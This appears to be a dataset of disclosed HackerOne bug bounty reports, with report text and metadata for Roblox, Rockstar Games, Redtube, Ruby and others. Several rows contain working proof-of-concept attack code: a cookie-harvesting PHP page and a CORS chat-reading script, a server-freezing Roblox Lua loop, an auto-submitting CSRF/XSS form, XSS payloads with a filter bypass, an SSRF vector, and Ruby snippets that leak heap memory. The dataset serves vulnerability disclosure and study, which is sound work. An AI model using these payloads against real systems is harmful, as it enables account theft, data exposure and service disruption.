An attacker can takeover the s3 bucket and can host his malicious content with the name (cefbinary${1}_macosx64.tar.bz2) as presented in the code and can spread ransomware and many malicious files. This bug has a critical impact because the code of the tool that many people uses, contains unclaimed s3 bucket.
Regards,
Gaurav Bhatia3 attachments:F1395337: reddits3poc1.JPGF1395338: reddits3poc2.JPGF1395340: reddits3poc3.JPG",https://hackerone.com/reports/1285598,California,United States,San Francisco,2021,7,31,17,51
Redtube,11-50,0.0,No value,"$1,000.00",High,7.95,Cross-site Scripting (XSS) - Stored,Blind XSS in redtube administering site my.reflected.net,johndoe1492  submitted a report to Redtube.Jun 8th (3 years ago)Summary by johndoe1492Blind XSS in Redtube WAF administering panel.,https://hackerone.com/reports/603941,Texas,United States,Houston,2019,6,8,11,11
Redtube,11-50,0.0,No value,"$10,000.00",Critical,9.8,Deserialization of Untrusted Data,Deserialization of untrusted data at https://www.redtube.com/media/hls?s=data,kevsecurity  submitted a report to Redtube.Aug 20th (about 1 year ago),https://hackerone.com/reports/1312641,Texas,United States,Houston,2021,8,20,7,1
Redtube,11-50,0.0,No value,"$1,500.00",Critical,9.5,Insecure Direct Object Reference (IDOR),idor allows you to delete photos and album from a gallery,black_b  submitted a report to Redtube.Jul 11th (4 years ago),https://hackerone.com/reports/380410,Texas,United States,Houston,2018,7,11,4,30
Redtube,11-50,0.0,No value,"$1,500.00",High,7.95,Cross-site Scripting (XSS) - Stored,Stored XSS in galleries - https://www.redtube.com/gallery/[id] path,"sp1d3rs  submitted a report to Redtube.Jul 10th (4 years ago)Summary by sp1d3rsStored XSS on the /gallery/ endpoint. Discovered in the day of public program launch.
Request interception was necessary.
Context:
Code 33 Bytes1<img src=""..."" alt=""[injection]"">
Sanitized characters:
Code 2 Bytes1<>
Payload:
Code 14 Bytes1""onload=[js]//
where [js] is any arbitrary javascript.
Similar to the #380204, but with different root cause.
Severity was set due to the factors such as: number of potential users affected, attack complexity, no user interaction vector, and possibility to steal sensitive information or bypass CSRF protection on the user's side.
I had previously some experience with triage team, so in this case it was enough to demonstrate simple popup, without complex payload.
Thanks to the team for great report handling and bounty!",https://hackerone.com/reports/380207,Texas,United States,Houston,2018,7,10,16,31
Redtube,11-50,0.0,No value,"$1,500.00",High,7.95,Cross-site Scripting (XSS) - Stored,Stored XSS on the https://www.redtube.com/users/[profile]/collections,"sp1d3rs  submitted a report to Redtube.Jul 10th (4 years ago)Summary by sp1d3rsStored XSS on the /users/<username>/collections and /users/<username>/favorites endpoints with same root cause. Discovered in the day of public program launch.
Request interception wasn't necessary.
Context:
Code 33 Bytes1<img src=""..."" alt=""[injection]"">
Sanitized characters:
Code 2 Bytes1<>
Payload:
Code 14 Bytes1""onload=[js]//
where [js] is any arbitrary javascript.
Severity was set due to the factors such as: number of potential users affected, attack complexity, no user interaction vector, and possibility to steal sensitive information or bypass CSRF protection on the user's side.
I had previously some experience with triage team, so in this case it was enough to demonstrate simple popup, without complex payload.
Thanks to the team for great report handling and bounty!",https://hackerone.com/reports/380204,Texas,United States,Houston,2018,7,10,16,20
Robinhood,1001-5000,0.0,1m-10m,$100.00,Low,2.0,Open Redirect,Open Redirect located at https://www.robinhood.com/oauth2/authorize/?,jon_bottarini  submitted a report to Robinhood.Feb 16th (6 years ago),https://hackerone.com/reports/206811,California,United States,Palo Alto,2017,2,16,3,35
Roblox,1001-5000,0.0,50m-100m,$800.00,Medium,5.4,Insecure Direct Object Reference (IDOR),Insecure redirect rule results in bypassing ban redirect on certain pages,"b62ba6bd20eb778df2a0691  submitted a report to Roblox.Sep 27th (3 years ago)Description
Account bans on Roblox work via redirect rules. If an user attempts go to a page that's outside a whitelisted set of rules, they'll be redirected back to the ban page.
After researching, I've found that the following rules are whitelisted and bypass this redirect:

Any URLs ending in a file extension (except for .aspx, .ashx)
https://www.roblox.com/request-error/*
https://www.roblox.com/login/*
https://www.roblox.com/info/*
https://www.roblox.com/support/ *
https://www.roblox.com/*/membership/*

All of these seem okay, except for https://www.roblox.com/*/membership/*. The /membership/ part is not anchored to the start of the URL.
In ASP.NET, we can actually insert paths after the extensions .aspx and .ashx, which will just be ignored by the server.
This allows us to access any pages ending in .aspx/.ashx without a ban-redirect, just by appending /membership/ after the extension. Ex.: https://www.roblox.com/my/money.aspx/membership/
Impact
An attacker would be able to access the following pages/apis with a banned account:

Create/update assets - https://data.roblox.com/Data/Upload.ashx
Post comments on assets - https://www.roblox.com/API/Comments.ashx
Trade Items (Unverified)   - https://www.roblox.com/Trade/tradehandler.ashx
Use any other page or API ending in .ashx/.aspx

A moderator couldn't do anything to stop the attacker from performing these actions. Bans would be ineffective.
Another thing I would like to mention is that banned accounts can access ANY web apis at api.roblox.com, without a need for a bypass or anything.Summary by b62ba6bd20eb778df2a0691An insecure redirect rule allowed an attacker to bypass the ban redirect on pages ending in .aspx/.ashx.
Additionally, I have also mentioned in my report that api.roblox.com did not have a check for banned authenticated sessions.",https://hackerone.com/reports/703058,California,United States,San Mateo,2019,9,27,16,31
Roblox,1001-5000,0.0,50m-100m,$500.00,Medium,5.45,Denial of Service,Malformed string sent through FireServer leads to server freezing/hanging,"albertl  submitted a report to Roblox.Aug 22nd (3 years ago)This was found an hour ago so if I get any information wrong, please comment and I'll get back to you!
A cheater/exploiter can hang any Roblox gameserver due to a 5 line script which sends a big malformed string through SayMessageRequest resulting in the server to hang itself. This works in any game that has the ""SayMessageRequest"" remote and can be done easily, especially if the attacker has some sort of ""script execution"" exploit on their hands.
To reproduce this exploit:
Go into Roblox Client/Studio
Execute this into the cmdbar
Code 234 BytesWrap lines Copy Download1local malformed = string.rep(""ก็็็▌▓"", math.random(10000, 2e5))
2local remote = game:GetService'ReplicatedStorage'.DefaultChatSystemChatEvents:WaitForChild'SayMessageRequest'
3while wait() do
4	remote:FireServer(malformed, malformed)
5end
Watch the server hang itself (try walking around).
Note: If done on Studio while playing solo, it seems to hang the entire program. Luckily I found a workaround to this by testing it in a local server with 2-3 players and then executing it on any of the player instances.
I've attached a PoC video.
Impact
Hang/Freeze any game servers which isn't intended.1 attachment:F562467: freeze.mp4",https://hackerone.com/reports/679907,California,United States,San Mateo,2019,8,22,18,24
Roblox,1001-5000,0.0,50m-100m,$500.00,Medium,5.45,Cross-site Scripting (XSS) - Reflected,Reflected XSS through multiple inputs in the issue collector on Jira,"jackb898  submitted a report to Roblox.Jul 11th (4 years ago)**Note I put this as Medium because that's what the CVE is. This vulnerability is known and it's classified under CVE-2018-5230. Here's a link to the thread on it by Atlassian: https://jira.atlassian.com/browse/JRASERVER-67289
Description
I noticed when testing that your Jira installation at jira.roblox.com is running on version 7.6.3, which isn't the latest version. When you have something like Jira or Wordpress, having the latest installation is critical because lots of vulnerabilities for previous versions will be disclosed right after the company releases the latest version. That was the case here.
So I decided that since it was on 7.6.3, I'd check CVEs and see if there were any that effected Jira installations 7.6.3 and newer. After a LOT of scouring (there's tons of CVEs for Jira on older or different platforms) I found CVE-2018-5230, which isn't very helpful but it led me in the direction of the issue collector.
CVE-2018-5230 outlines ""XSS in the issue collector"" but doesn't specify anything, so that was left up to me.
Locations
After some testing in all of the issue collector, I've compiled this list of the reflected XSS locations in it. To make it easier, I've set this up with each having it's own number and explanation on how to use it.
There's only one filter that I've found for these; when using certain HTML tags like ""src="" and in JS alerts using alert(""texthere""), it appends two backslashes, ex. if you put in this payload: 
Code 36 BytesWrap lines Copy Download1<iframe src=""//google.com""></iframe>
The output in the page will be:
Code 50 BytesWrap lines Copy Download1<iframe src=""\&quot;//google.com\&quot;""></iframe>
HOWEVER I found a bypass to this filter; instead of using double quotes, simply use all single quotes in payloads. For example if you use the payload 
Code 36 BytesWrap lines Copy Download1<iframe src='//google.com'></iframe>
The output will be:
Code 36 BytesWrap lines Copy Download1<iframe src=""//google.com""></iframe>
1ST AREA
https://jira.roblox.com/issues/?filter=-8 in the ""Updated Date"" section.
HOW TO EXPLOIT:

Go to the link above
Click the ""Updated Date:"" text area
Put your XSS payload in ""More than [ ] minutes ago"" (15 character payload limit) or in ""In range [   ] to [   ]"" (No length limit, ONLY put the payload in the first box)
Click Update
Payload will run. If it doesn't run chances are you used double quotes somewhere. Only use single quotes!

Each area past this first one uses the exact same method of exploitation and has the same inputs/outputs so I'll just put the links to them
https://jira.roblox.com/issues/?filter=-7
https://jira.roblox.com/issues/?filter=-6
Resolution
Update your JIRA version to 7.6.7 or later, might as well update to the latest version. This should sufficiently patch all of these vulnerabilities.
Additional Information
I know this isn't a core Roblox domain but I strongly believe it has the same impact regardless; as you can see from the attachment:
Image F319184: fb6e03df7ca0f99504a9d2b39770dc0d.png 40.45 KiBZoom in Zoom out Copy Download
The core Roblox cookies are shared onto this domain, so that's a main factor in why this has equal impact as to if it were on roblox.com.
Impact
An attacker could use carefully crafted payloads with simple social engineering to steal Roblox user's accounts. As I've mentioned, the cookies from Roblox's core site are shared with this one as well, and while it may not be a core Roblox site, it's still a *.roblox.com so any suspicions of phishing by the victim could be excused with that reasoning.
Additionally, with XSS you can use specially designed iframes linked to your own JS content, allowing jacking of cookies and other information from the victim.1 attachment:F319184: fb6e03df7ca0f99504a9d2b39770dc0d.pngSummary by jackb898I was able to decipher a CVE and apply it, in this case leading to reflected XSS through multiple inputs on the Jira issue collector. Thank you to the Roblox team for working with me well to help resolve this vulnerability.",https://hackerone.com/reports/380354,California,United States,San Mateo,2018,7,11,0,51
Roblox,1001-5000,0.0,50m-100m,"$1,000.00",High,7.95,Privilege Escalation,Subdomain Takeover at creatorforum.roblox.com,"jackb898  submitted a report to Roblox.Aug 30th (5 years ago)Hello.
A few days ago, I was looking at Roblox subdomains, and I noticed an unusual one called creatorforum.roblox.com. Upon further investigation, I visited it and saw that creatorforum.roblox.com's CNAME was a nonexistant Discourse website.
I immediately reported to info@roblox.com, and eventually talked to Antek Baranski on the bugbounty@roblox.com email address. The issue has been fixed since reporting, but I was told to send a report here.
If I had a Discourse account, I could've taken over the CNAME for creatorforum.roblox.com and then it would've been a full subdomain takeover on that subdomain.
As mentioned earlier in the report, the issue has been resolved and as you can see the subdomain creatorforum.roblox.com no longer exists.
Thanks,
JackSummary by jackb898creatorforum.roblox.com was pointing to a nonexistent Discourse website allowing for a subdomain takeover to occur. Thank you to the roblox team for quickly resolving this and awarding me a bounty.",https://hackerone.com/reports/264494,California,United States,San Mateo,2017,8,30,1,51
Roblox,1001-5000,0.0,50m-100m,"$2,500.00",Critical,9.4,None,Subdomain Takeover to Authentication bypass ,"geekboy  submitted a report to Roblox.Apr 9th (5 years ago)## Vulnerability Type:
Subdomain Takeover
## Description:
Due to unclaimed or expired Hubspot instance an attacker is able to claim and serve content from devrel.roblox.com and perform different kind of attacks which i shared in impact section.
## Affected Area:
http://devrel.roblox.com
## Steps to Reproduce:

Visit: https://devrel.roblox.com/subdomain-takeover

Image F283580: takeover.PNG 16.86 KiBZoom in Zoom out Copy Download
## Mitigation:

Remove the CNAME entry for the devrel.roblox.com

Impact
Let's talk about about in details, as attacker could possible takeover other users account. 

As .ROBLOSECURITY cookies is scoped to *.roblox.com means same cookies shared with all other subdomain, i'm not much familiar with hubspot with hosting following code on will steal all the users cookie who visit this subdomain.

Image F283554: shared_cookie.PNG 58.90 KiBZoom in Zoom out Copy Download
steal_cookie.php
Code 179 BytesWrap lines Copy Download1<html>
2<body>
3<?php
4echo ""Cookies received: <br>"";
5
6foreach ($_COOKIE as $key=>$val)
7  {
8    echo ""Set-Cookie: $key=$val; Domain=.roblox.com; path=/<br>\n"";
9  }
10?>
11</body>
12</html>

Also devrel.roblox.com can be used to read all the chats between other users as
devrel.roblox.com is also white listed to make CORS request at  chat.roblox.com 

Image F283553: reading_chats.PNG 105.57 KiBZoom in Zoom out Copy Download
Which can be done like this: 
Code 542 BytesWrap lines Copy Download1
2<h2>CORS To Read Chat</h2>
3<div id=""demo"">
4<button type=""button"" onclick=""cors()"">Chat Reader @ Roblox</button>
5</div>
6 
7<script>
8function cors() {
9  var xhttp = new XMLHttpRequest();
10  xhttp.onreadystatechange = function() {
11    if (this.readyState == 4 && this.status == 200) {
12      document.getElementById(""demo"").innerHTML = document.write(this.responseText);
13    }
14  };
15  xhttp.open(""GET"", ""https://chat.roblox.com/v2/get-messages?conversationId=469104576&pageSize=3"", true);
16  xhttp.withCredentials = true;
17  xhttp.send();
18}
19</script>
Apart form all above issue, attacker can do following things as well.

Creating fake login page for credentials harvesting.
Sharing malicious files using roblox.
Creating mail account using GSuite to send and recived emails on behalf of *@devrel.roblox.com
3 attachments:F283553: reading_chats.PNGF283554: shared_cookie.PNGF283580: takeover.PNG",https://hackerone.com/reports/335330,California,United States,San Mateo,2018,4,9,23,7
Rockstar Games,1001-5000,0.0,10m-50m,"$1,400.00",Critical,9.5,Cross-Site Request Forgery (CSRF),<- Critical IDOR vulnerability in socialclub allow to insert and delete comments as another user and it discloses sensitive information ->,rz01  submitted a report to Rockstar Games.Feb 7th (6 years ago),https://hackerone.com/reports/204292,New York,United States,New York,2017,2,7,17,36
Rockstar Games,1001-5000,0.0,10m-50m,$650.00,Medium,5.45,Cross-site Scripting (XSS) - Generic,[IMP] - Blind XSS in the admin panel for reviewing comments,anshuman_bh  submitted a report to Rockstar Games.Jan 10th (6 years ago),https://hackerone.com/reports/197337,New York,United States,New York,2017,1,10,19,16
Rockstar Games,1001-5000,0.0,10m-50m,$500.00,Medium,5.45,Violation of Secure Design Principles,Ability to post comments to a crew even after getting kicked out,"anshuman_bh  submitted a report to Rockstar Games.Jan 10th (6 years ago)Summary by anshuman_bhTL;DR - Members who got kicked out of the crew, their sessions weren't being invalidated and they still had the old perms",https://hackerone.com/reports/197153,New York,United States,New York,2017,1,10,7,57
Rockstar Games,1001-5000,0.0,10m-50m,"$1,000.00",High,8.7,Cross-Site Request Forgery (CSRF),Account Takeover using Linked Accounts due to lack of CSRF protection,rafiem  submitted a report to Rockstar Games.Dec 16th (4 years ago),https://hackerone.com/reports/463330,New York,United States,New York,2018,12,16,0,36
Rockstar Games,1001-5000,0.0,10m-50m,"$1,500.00",Medium,5.45,Server-Side Request Forgery (SSRF),Blind SSRF in emblem editor (2),"alexbirsan  submitted a report to Rockstar Games.Aug 31st (5 years ago)Hello,
As per your recommendation in #233301, I'm submitting a PoC for another blind SSRF in the emblem editor.
To oversight here is allowing absolute url() values for the fill attribute:
<path fill=""url(https://requestb.in/15rxmgv1#test)"" stroke=""#a1a1a1""  ... 
Upon publishing an emblem containing such an element, a HTTP request to the given URL is sent from a Rockstar server. (███). The destination port can be easily modified. This doesn't seem to work without including a fragment in the URL (#test in the example above).
Further testing showed that, if a valid SVG is found at the given URL, the fill data is actually used in the final image. Fortunately, ████████ doesn't seem to support scripts, although the possibility of finding another way to exfiltrate data doesn't seem that out of reach.
I've attached the full body of the emblem I've used to confirm this bug for ease of reproduction.Summary by alexbirsanAug 31 - Found a blind SSRF
Sep 1 - Found a way to escalate - retrieving image files from the server or other places
Sep 28 - Problem fixed, $1,250 bounty!
Sep 29 - Found a bypass for the fix just before disclosure
Oct 13 - Bypass is fixed too
Oct 18 - $250 bonus for the bypass! 
Most importantly, I got a cool emblem:",https://hackerone.com/reports/265050,New York,United States,New York,2017,8,31,19,38
Rockstar Games,1001-5000,0.0,10m-50m,$250.00,Low,2.0,Improper Restriction of Authentication Attempts,Brute Force against VMware Horizon,ivanglinkin  submitted a report to Rockstar Games.Jul 26th (about 1 year ago),https://hackerone.com/reports/1278072,New York,United States,New York,2021,7,26,15,19
Rockstar Games,1001-5000,0.0,10m-50m,$500.00,Medium,5.45,Improper Authentication - Generic,Bypass CAPTCHA protection,exception  submitted a report to Rockstar Games.Mar 3rd (6 years ago),https://hackerone.com/reports/210417,New York,United States,New York,2017,3,3,16,32
Rockstar Games,1001-5000,0.0,10m-50m,$500.00,Medium,5.45,Code Injection,"Client-side Template Injection in Search, user email/token leak and maybe sandbox escape","europa  submitted a report to Rockstar Games.Sep 26th (5 years ago)Summary by europaSometimes you don't need a fully-fledged XSS to leak useful data!
An AngularJS template injection was possible in the search field giving me access to the whole AngularJS scope for the page.
By traversing the DOM via childHead / nextSibling objects it was possible to grab informations from the active scope (ie: email, userid, and tokens); subsequently manipulating the victim's avatar URL to a resource on an adversary-controlled server allowed the attacker to exfiltrate session details without strictly relying on Javascript injection, delivering the goodies through simple GET requests.
A sandbox escape was found later on rendering the unorthodox approach unnecessary, but extremely fun nonetheless—also given the fact that Rockstar Games decided scoped this flaw as a Reflected XSS before that happened.",https://hackerone.com/reports/271960,New York,United States,New York,2017,9,26,13,17
Rockstar Games,1001-5000,0.0,10m-50m,$500.00,Medium,5.45,Code Injection,Comments Denial of Service in socialclub.rockstargames.com,ramsexy  submitted a report to Rockstar Games.Mar 18th (6 years ago),https://hackerone.com/reports/214370,New York,United States,New York,2017,3,18,2,35
Rockstar Games,1001-5000,0.0,10m-50m,$350.00,Low,2.0,Improper Authentication - Generic,Control Character Injection In Messages,exception  submitted a report to Rockstar Games.Mar 6th (6 years ago)jmarshall Rockstar Games staff  changed the status to Triaged. Mar 7th (6 years ago)Rockstar Games  rewarded exception with a $350 bounty. Mar 7th (6 years ago)jmarshall Rockstar Games staff  closed the report and changed the status to Resolved. Mar 21st (6 years ago)exception   requested to disclose this report. May 4th (6 years ago)jmarshall Rockstar Games staff  changed the report title. May 23rd (5 years ago)jmarshall Rockstar Games staff  agreed to disclose this report. May 23rd (5 years ago)  This report has been disclosed. May 23rd (5 years ago)exception   posted a comment. Apr 19th (5 years ago)jmarshall Rockstar Games staff  posted a comment. Apr 19th (5 years ago)jmarshall Rockstar Games staff  changed the scope. Nov 19th (3 years ago)jmarshall Rockstar Games staff  updated the severity to low. Jun 25th (2 years ago)Summary by exceptionThe impact of this issue : is that the injector user can make the browser fails to load the response containing control characters and victim user would not be able to view messages %00   .,https://hackerone.com/reports/210994,New York,United States,New York,2017,3,6,2,39
Rockstar Games,1001-5000,0.0,10m-50m,$250.00,Low,2.0,Code Injection,Control characters incorrectly handled on Crew Status Update,zuhnny1  submitted a report to Rockstar Games.May 27th (5 years ago),https://hackerone.com/reports/232499,New York,United States,New York,2017,5,27,21,10
Rockstar Games,1001-5000,0.0,10m-50m,$750.00,Medium,5.45,Cross-Site Request Forgery (CSRF),CSRF in 'set.php' via age causes stored XSS on 'get.php' - http://www.rockstargames.com/php/videoplayer_cache/get.php',"nahamsec  submitted a report to Rockstar Games.Jul 18th (6 years ago)Hello,
Background:
Sending a POST request to set.php with age='PAYLOAD' will cause a stored XSS on the GET.php file (most likely caused by the cookie, since that's what the age is based on). For this vulnerability and in order to demonstrate BOTH CSRF and XSS I have written a simple script (tested on firefox)  that automatically sends the request to set.php and redirects you to the vulnerable file:
POC:
Code 648 BytesWrap lines Copy Download1<iframe style=""display:none"" name=""csrf-frame"" id=""csrf-frame""></iframe><form method=""POST"" action=""http://www.rockstargames.com/php/videoplayer_cache/set.php"" target=""csrf-frame"" id=""csrf-form"" encType=""application/x-www-form-urlencoded""><input type=""text"" name=""age"" value='<a href=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==>CLICK ME</a>' /></form><script>document.getElementById(""csrf-form"").submit();</script><script>var xssframe = document.getElementById('csrf-frame');xssframe.addEventListener(""load"", function() { window.location='http://www.rockstargames.com/php/videoplayer_cache/get.php'; }); </script>
Thanks,
Ben",https://hackerone.com/reports/152013,New York,United States,New York,2016,7,18,8,24
Rockstar Games,1001-5000,0.0,10m-50m,$150.00,Low,2.0,Cross-Site Request Forgery (CSRF),csrf in https://www.rockstargames.com/reddeadonline/feedback/submit.json,netfuzzer  submitted a report to Rockstar Games.Feb 13th (3 years ago),https://hackerone.com/reports/796295,New York,United States,New York,2020,2,13,22,58
Rockstar Games,1001-5000,0.0,10m-50m,$600.00,High,7.95,Cross-Site Request Forgery (CSRF),CSRF Vulnerability allows attackers to steal SocialClub private token.,netfuzzer  submitted a report to Rockstar Games.Jul 24th (5 years ago),https://hackerone.com/reports/253128,New York,United States,New York,2017,7,24,21,46
Rockstar Games,1001-5000,0.0,10m-50m,$500.00,Medium,5.45,Cross-site Scripting (XSS) - Generic,DOM based reflected XSS in rockstargames.com/newswire/tags through cross domain ajax request,"zombiehelp54  submitted a report to Rockstar Games.Sep 29th (6 years ago)Hi,
I have found a reflected XSS issue in http://www.rockstargames.com/newswire/tags which is , IMO , somekinda tricky. 
PoC:

URL: http://www.rockstargames.com/newswire/tags#/?tags=\%2e%2e\%2e%2e\%2e%2e\comments_dal\users\getGlobalLoginSettings%2ejson?callback=alert(%2fxss%2f);%2f%2f 
Vulnerable Parameter: #/?tags= 
Payload: \%2e%2e\%2e%2e\%2e%2e\comments_dal\users\getGlobalLoginSettings%2ejson?callback=alert(%2fxss%2f);%2f%2f  

Image F123778: xss_rockstargames.png 276.60 KiBZoom in Zoom out Copy Download
The value of the tags parameter is sent as an XHR request to /newswire/tagContent/[tags_param]/1 and the response gets printed in the page , also I have found that if the content-type of the response is application/javascript , it gets executed as javascript.
After digging for a while I found this endpoint www.rockstargames.com/comments_dal/users/getGlobalLoginSettings.json which returns a callback function in the response if the request is XHR. so I used the callback function to execute javascript through ?callback=alert(/xss/);// 
Thanks!1 attachment:F123778: xss_rockstargames.png",https://hackerone.com/reports/172843,New York,United States,New York,2016,9,29,8,28
Rockstar Games,1001-5000,0.0,10m-50m,$500.00,Medium,5.45,Cross-site Scripting (XSS) - DOM,dom based xss in http://www.rockstargames.com/GTAOnline/ (Fix bypass),netfuzzer  submitted a report to Rockstar Games.Aug 19th (5 years ago)netfuzzer   changed the report title. Aug 19th (5 years ago)asuka   closed the report and changed the status to Duplicate (#254343). Aug 19th (5 years ago)jmarshall Rockstar Games staff  reopened this report. Aug 21st (5 years ago)netfuzzer   posted a comment. Aug 21st (5 years ago)netfuzzer   posted a comment. Aug 21st (5 years ago)jmarshall Rockstar Games staff  updated the severity to medium. Aug 21st (5 years ago)jmarshall Rockstar Games staff  changed the status to Triaged. Aug 21st (5 years ago)Rockstar Games  rewarded netfuzzer with a $500 bounty. Aug 21st (5 years ago)netfuzzer   posted a comment. Aug 21st (5 years ago)jmarshall Rockstar Games staff  posted a comment. Aug 24th (5 years ago)netfuzzer   posted a comment. Aug 24th (5 years ago)jmarshall Rockstar Games staff  closed the report and changed the status to Resolved. Aug 24th (5 years ago)netfuzzer   requested to disclose this report. Aug 24th (5 years ago)jmarshall Rockstar Games staff  agreed to disclose this report. Aug 24th (5 years ago)  This report has been disclosed. Aug 24th (5 years ago),https://hackerone.com/reports/261571,New York,United States,New York,2017,8,19,13,13
Rockstar Games,1001-5000,0.0,10m-50m,$750.00,Medium,5.4,Cross-site Scripting (XSS) - DOM,"DOM based XSS on /GTAOnline/de/news/article via ""returnUrl"" parameter",netfuzzer  submitted a report to Rockstar Games.Mar 12th (4 years ago),https://hackerone.com/reports/508475,New York,United States,New York,2019,3,12,15,20
Rockstar Games,1001-5000,0.0,10m-50m,"$1,000.00",Medium,4.2,Cross-Site Request Forgery (CSRF),CSRF Vulnerability on https://signin.rockstargames.com/tpa/facebook/link/,netfuzzer  submitted a report to Rockstar Games.Jan 4th (4 years ago),https://hackerone.com/reports/474833,New York,United States,New York,2019,1,4,19,53
Rockstar Games,1001-5000,0.0,10m-50m,$500.00,Medium,5.45,Cross-site Scripting (XSS) - Reflected,dom based xss in https://www.rockstargames.com/GTAOnline/,netfuzzer  submitted a report to Rockstar Games.Jul 28th (5 years ago)netfuzzer   changed the report title. Jul 28th (5 years ago)dukefleed   changed the status to Needs more info. Jul 28th (5 years ago)netfuzzer   changed the status to New. Updated Jul 28th (5 years ago)netfuzzer   posted a comment. Updated Jul 30th (5 years ago)netfuzzer   posted a comment. Aug 2nd (5 years ago)jmarshall Rockstar Games staff  changed the status to Triaged. Aug 3rd (5 years ago)netfuzzer   posted a comment. Aug 10th (5 years ago)jmarshall Rockstar Games staff  posted a comment. Aug 10th (5 years ago)Rockstar Games  rewarded netfuzzer with a $500 bounty. Aug 11th (5 years ago)netfuzzer   posted a comment. Updated Aug 11th (5 years ago)netfuzzer   posted a comment. Aug 15th (5 years ago)jmarshall Rockstar Games staff  posted a comment. Aug 21st (5 years ago)jmarshall Rockstar Games staff  closed the report and changed the status to Resolved. Aug 21st (5 years ago)netfuzzer   requested to disclose this report. Aug 21st (5 years ago)jmarshall Rockstar Games staff  agreed to disclose this report. Aug 21st (5 years ago)  This report has been disclosed. Aug 21st (5 years ago),https://hackerone.com/reports/254343,New York,United States,New York,2017,7,28,18,13
Rockstar Games,1001-5000,0.0,10m-50m,$150.00,Low,3.1,Cross-Site Request Forgery (CSRF),CSRF Vulnerability on post creation page /community/create-post.json,netfuzzer  submitted a report to Rockstar Games.Jan 29th (4 years ago),https://hackerone.com/reports/487378,New York,United States,New York,2019,1,29,1,51
Ruby,501-1000,1.0,No value,$500.00,No value,0.0,Memory Corruption - Generic,Arbitrary heap exposure in JSON.generate,"ahmadsherif  submitted a report to Ruby.Mar 1st (6 years ago)Running this snippet can expose arbitrary memory:
Code 100 BytesWrap lines Copy Download1require 'json'
2
3state = JSON.state.new
4state.space = ""\0"" * 1024
5
6puts JSON.generate({a: :b}, state)
Code 327 BytesWrap lines Copy Download1{""a"":
2psych/handlers/recorder.rb
3tensi0
4reeze)
5Gem::Specification.new do |s|
6  # to objects of the same type as the original delegate.
7mydata/scm/git/ruby/dist/lib/ruby/2.5.0/json/ext.rb
8pass the namP
9See http://guides.rubygems.org/specification-reference/ for help
10#     # constant and class member data initialization...
11""b""}
The issues lies in using strdup in generator.c, which will stop after encountering a NULL byte returning a pointer to zero length string, which is not the length stored in space_len. Eventually fbuffer_append will copy the length of the string (e.g. the 1024 above) into the generated buffer.
Simpler snippets like JSON.generate({foo: ""bar""}, space: ""\0"" * 1024 suffer the same issue but for slightly different reason; as fstrndup is using memccpy which will, again, stop copying after encountering a NULL byte returning a pointer to zero length string.",https://hackerone.com/reports/209949,No value,No value,No value,2017,3,1,22,55
Ruby,501-1000,1.0,No value,$200.00,Low,2.0,Information Disclosure,"Arbitrary heap overread in strscan on 32 bit Ruby, patch included","guido  submitted a report to Ruby.Sep 7th (6 years ago)Code 153 BytesWrap lines Copy Download1require 'strscan'
2x = 'x' * 0x7FFFFFFE
3s = StringScanner.new(x)
4s.pos = 0x7FFFFFFD
5t = s.peek(40000)
6t.each_byte do |i|
7	if i != 0
8		print i.chr
9	end
10end
Run:
Code 21 BytesWrap lines Copy Download1./ruby r.rb | strings
My output:
Code 2.48 KiBWrap lines Copy Download1@	;>@V`TdBE
2__gmon_start___fini_ITM_deregisterTMCloneTable_ITM_registerTMCloneTable__cxa_finalize_Jv_RegisterClassesonig_region_memsizeonig_region_freeruby_xfreerb_gc_markrb_check_typeddatarb_num2longrb_eRangeErrorrb_raiserb_int2bigrb_eArgErrorrb_string_valuerb_reg_region_copyrb_memerrorrb_scan_argsrb_data_typed_object_zalloconig_region_initrb_str_newrb_str_dumprb_str_new_staticrb_str_catrb_funcallrb_str_lengthrb_str_appendrb_warningrb_enc_copyrb_sym2strrb_enc_getonig_name_to_backref_numberrb_eIndexErrorrb_enc_raiseonig_region_clearonig_region_setrb_enc_mbclenrb_check_typerb_reg_prepare_reonig_matchonig_freeonig_searchrb_obj_classrb_sprintfInit_strscanrb_cObjectrb_define_classrb_eStandardErrorrb_define_class_underrb_const_definedrb_obj_freezerb_const_setrb_define_alloc_funcrb_define_private_methodrb_define_singleton_methodrb_define_methodrb_intern2rb_aliaslibpthread.so.0libdl.so.2libcrypt.so.1libm.so.6libc.so.6_edata__bss_start_endGLIBC_2.1.3
3@xh[
4D$ P
5UWVS
6[^_]
7&UWVS
8[^_]
9t&WVS
10t&VS
11'WVS
12D$ P
13t&UWVS
14[^_]
15;|$0|
16L$0)
17;|$0|
18L$0)
19'UWVS
20l$<P
21[^_]
22~`9G
23[^_]
24PjjW
25vWVS
26PjjW
27t&WVS
28PjjW
29vUWVS
30[^_]
31vUWVS
32|$@P
33[^_]
34'UWVS
35|$<j
36[^_]
37~$RW
38QRQU
39&UWVS
40|$<j
41[^_]
42~$RW
43RPRPU
44UWVS
45|$<j
46[^_]
47~$RW
48QRQU
49[^_]
50UWVS
51|$<j
52[^_]
53~$RW
54RPRPU
55&UWVS
56|$<j
57[^_]
58~$RW
59RPRPU
60[^_]
61&UWVS
62|$<j
63[^_]
64~$RW
65QRQU
66'UWVS
67|$<j
68[^_]
69~$RW
70QRQU
71UWVS
72|$<j
73[^_]
74~$RW
75RPRPU
76UWVS
77|$<j
78[^_]
79~$RW
80RPRPU
81UWVS
82|$<j
83[^_]
84~$RW
85QRQU
86t&UWVS
87|$<P
88[^_]
89'UWVS
90[^_]
91&UWVS
92[^_]
93vWVS
94^j/P
95 jPW
96 [^_
97uninitialized StringScanner objectunscan failed: previous match record not existStringScanner#clear is obsolete; use #terminate insteadStringScanner#restsize is obsolete; use #rest_size insteadundefined group name reference: %.*sStringScanner#getbyte is obsolete; use #get_byte insteadStringScanner#peep is obsolete; use #peek insteadStringScanner#empty? is obsolete; use #eos? instead$Id: strscan.c 52988 2015-12-09 01:01:17Z ko1 $index out of range11...regexp buffer overflow#<%li
98 (uninitialized)>#<%li
99 fin>#<%li
100 %ld/%ld @ %li
101>#<%li
102 %ld/%ld %li
103 @ %li
104>ScanErrorbytesliceStringScanner0.7.0VersionIdinitializeinitialize_copymust_C_versionresetterminateclearstringstring=concat<<pos=charpospointerpointer=skipmatch?checkscan_fullscan_untilskip_untilexist?check_untilsearch_fullgetchget_bytegetbytepeekpeepunscanbeginning_of_line?bol?eos?empty?rest?matched?matchedmatched_size[]pre_matchpost_matchrestrest_sizerestsizeinspect
105;*2$""
106 pH	p
107vGCC: (Debian 4.9.2-10) 4.9.2
